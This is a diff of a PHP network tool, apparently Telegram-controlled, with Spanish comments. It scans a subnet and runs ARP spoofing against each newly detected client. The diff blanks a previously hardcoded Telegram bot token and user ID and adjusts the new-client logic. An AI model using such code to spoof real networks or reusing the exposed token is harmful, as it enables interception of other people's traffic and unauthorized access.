@@ -19,9 +19,9 @@
  *#############################################################*/
 
 define('TELEGRAMWEB', 'https://api.telegram.org/bot');
-define('TOKEN', '495885526:AAEvwnYpxrkwYWuazTP8f_z1MTSWr1_KZZM');
+define('TOKEN', '');
 define('TELTIMEOUT', 20);
-define('MYID', '152434382');
+define('MYID', '');
 define('AUTOR', 'SECURY');
 
 
@@ -130,7 +130,6 @@ if(preg_match('/(\d+\.\d+\.\d+\.\d+\/\d+)/', $ip_to_nmap)){
      *   -> IP, Mac y Marca.
      */
     for ($i=0; $i < sizeof($user_data[0]); $i++) { 
-  	  echo "\nUser con IP (".$user_data[1][$i].") y MAC (".$user_data[2][$i].") con Marca (".$user_data[3][$i].")\n";
   	
   	  // Para descartar la IP del Router.
   	  $RouterIP = $Hunter->getApIP();
@@ -138,8 +137,8 @@ if(preg_match('/(\d+\.\d+\.\d+\.\d+\/\d+)/', $ip_to_nmap)){
 
   	    // Validando si ha entrado un nuevo cliente.
   	    $resultval = $HQuery->valNewClient($user_data[1][$i],$user_data[2][$i]);
-  	    if($resultval == 0){
-
+  	    if($resultval == 1){
+          echo "\nNew User con IP (".$user_data[1][$i].") y MAC (".$user_data[2][$i].") con Marca (".$user_data[3][$i].")\n";
           // ArpSpoofing al nuevo cliente.
   	  	  $pid = $Hunter->makeArpSpoofing($user_data[1][$i]);
 
@@ -168,6 +167,11 @@ if(preg_match('/(\d+\.\d+\.\d+\.\d+\/\d+)/', $ip_to_nmap)){
       $Bot->sendMessageBoard(MYID,"👉 Selecciona una opción:",$replyMarkup);
       $replyMarkup = json_decode($replyMarkup,true);
       $flag =false;
+      unset($replyMarkup);
+      $replyMarkup = array(
+        'keyboard' => array(),
+        'resize_keyboard' => true,
+      );
     }
 
     echo "\n=================================================================\n";
